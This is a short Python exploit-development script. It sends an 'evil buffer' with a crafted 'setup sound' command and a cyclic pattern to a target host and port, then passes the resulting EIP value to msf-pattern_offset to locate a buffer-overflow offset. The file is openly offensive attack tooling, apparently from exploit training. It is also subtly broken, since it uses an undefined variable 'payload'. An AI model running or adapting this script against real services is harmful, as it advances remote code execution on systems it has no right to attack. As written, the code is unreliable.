#!/usr/bin/python3
import socket
import sys
import os

if len(sys.argv) != 4:
    print("\nUsage: " + sys.argv[0] + " <target ip> <target port> <pattern>")
    exit(1)
host = sys.argv[1]
port = int(sys.argv[2])
pattern = sys.argv[3]

buffer = "\x11(setup sound " + pattern + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")

s.connect((host, port))
print(s.recv(1024))

s.send(bytes(buffer, "latin1"))
s.close()

print("[*]Payload Sent!")

eip = input("\nWhat is EIP now?\t")
print()
print("msf-pattern_offset -l " + str(len(payload)) + " -q " + str(eip))
os.system("msf-pattern_offset -l " + str(len(payload)) + " -q " + str(eip))
